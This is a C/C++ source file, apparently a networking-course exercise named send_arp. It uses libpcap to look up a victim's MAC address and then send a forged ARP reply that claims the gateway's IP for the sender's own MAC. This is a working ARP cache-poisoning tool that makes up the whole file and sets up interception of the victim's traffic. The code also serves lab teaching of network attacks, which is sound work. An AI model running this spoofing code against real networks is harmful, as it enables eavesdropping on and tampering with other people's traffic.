#include <pcap.h>
#include <stdio.h>
#include <stdint.h>

#include "pkt.h"

void usage(){
    printf("syntax : send_arp <interface> <sender ip> <target ip>");
    printf("sample : send_arp eth0 192.168.0.10 192.168.0.1");
}

int main(int argc, char* argv[]){
    if (argc != 4){
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    u_char packet[LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H];
    Pkt arppkt(packet);

    //setting my_mac, my_ip
    arppkt.getMyMac(dev);
    arppkt.getMyIp(dev);
    /*for debug my mac and ip
    arppkt.printMac(arppkt.my_mac);
    arppkt.printIp(reinterpret_cast<struct in_addr *>(&arppkt.my_ip));
    */

    //request sender mac
    //dmac : ff:ff:ff:ff:ff:ff
    //smac : my_mac
    //op   : arp_request (1)
    //smac : my_mac
    //sip  : my_ip
    //tmac : 00:00:00:00:00:00
    //tip  : 192.168.0.10 (example)
    arppkt.setArp(ARPOP_REQUEST);
    arppkt.setMac(arppkt.ethhdr->ether_dhost, 0xff);
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = arppkt.my_ip;
    arppkt.setMac(arppkt.arphdr->ar_tha, static_cast<uint8_t>(0x00)); //static cast is to remove error about 'is 0x00 address value?'
    arppkt.arphdr->ar_tip = inet_addr(argv[2]);
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);

    //recv arp reply packet
    //while(true)
    //if sip==192.168.0.10 && tip==my_ip && op==2
    //save sender mac and break
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* p;
        int res = pcap_next_ex(handle, &header, &p);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("I'm running!\n");
        Pkt pkt(p);
        if(pkt.isArp()){
            printf("ARP Packet is recieved\n");
            if(pkt.arphdr->ar_sip == arppkt.arphdr->ar_tip && pkt.arphdr->ar_tip == arppkt.my_ip && pkt.arphdr->lah.ar_op == ntohs(ARPOP_REPLY)){
                arppkt.setMac(arppkt.ethhdr->ether_dhost, pkt.arphdr->ar_sha);
                arppkt.setMac(arppkt.arphdr->ar_tha, pkt.arphdr->ar_sha);
                break;
            }
        }
    }

    //setting arp reply packet
    //dmac : sender_mac
    //smac : my_mac
    //op   : arp_reply (2)
    //smac : my_mac
    //sip  : 192.168.0.1
    //tmac : sender_mac
    //tip  : sender_ip
    arppkt.setArp(ARPOP_REPLY);
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = inet_addr(argv[3]);
    arppkt.arphdr->ar_tip = inet_addr(argv[2]);
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);
    printf("Success!\n");
    pcap_close(handle);
    return 0;
}
